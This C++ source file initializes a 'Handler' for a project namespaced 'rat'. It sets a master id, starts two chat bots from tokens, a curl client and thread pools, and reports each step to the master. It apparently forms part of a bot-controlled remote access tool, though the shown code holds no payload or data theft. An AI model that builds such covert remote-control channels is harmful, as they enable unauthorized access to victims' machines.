#include "rat/Handler.hpp"
#include "rat/ThreadPool.hpp"
#include "rat/tbot/tbot.hpp"
#include <fmt/core.h>
#include <memory>

#include "rat/handler/debug.hpp"

namespace rat::handler {

void Handler::setMasterId(const uint64_t Master_Id) {
	this->master_id = Master_Id;
}

void Handler::initMainBot(const char *arg_Token) {
	HANDLER_DEBUG_LOG("instantiating the main bot");
	this->bot = std::make_unique<::rat::tbot::Bot>(arg_Token, this->master_id);
	this->bot->sendMessage("This Bot has been initialized");
	this->bot->setOffset();
}

void Handler::initBackingBot(const char *arg_Token) {
	HANDLER_DEBUG_LOG("Istantiating the backing bot");
	this->backing_bot = std::make_unique<::rat::tbot::BaseBot>(arg_Token, this->master_id);
	this->backing_bot->sendMessage("This Bot has been initialized");
}

void Handler::initCurlClient(uint8_t Operation_Restart_Bound) {
	HANDLER_DEBUG_LOG("Istantiating the curl client");
	this->curl_client = std::make_unique<::rat::networking::Client>(Operation_Restart_Bound);
	this->bot->sendMessage("Handler's Curl client has been initialized");
}
void Handler::initThreadPools(uint8_t Number_Long_Process_Threads, uint8_t Number_Short_Process_Threads, uint8_t Number_Helper_Threads) {
	HANDLER_DEBUG_LOG("instantiating the thread pools");
	this->long_process_pool = std::make_unique<::rat::threading::ThreadPool>(Number_Long_Process_Threads);
	this->short_process_pool = std::make_unique<::rat::threading::ThreadPool>(Number_Short_Process_Threads);
	this->bot->sendMessage(fmt::format("Working threads have been created: \n{} for short processes\n{} for long processes",
									   this->short_process_pool->getWorkersSize(), this->long_process_pool->getWorkersSize()));
}

} // namespace rat::handler
#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
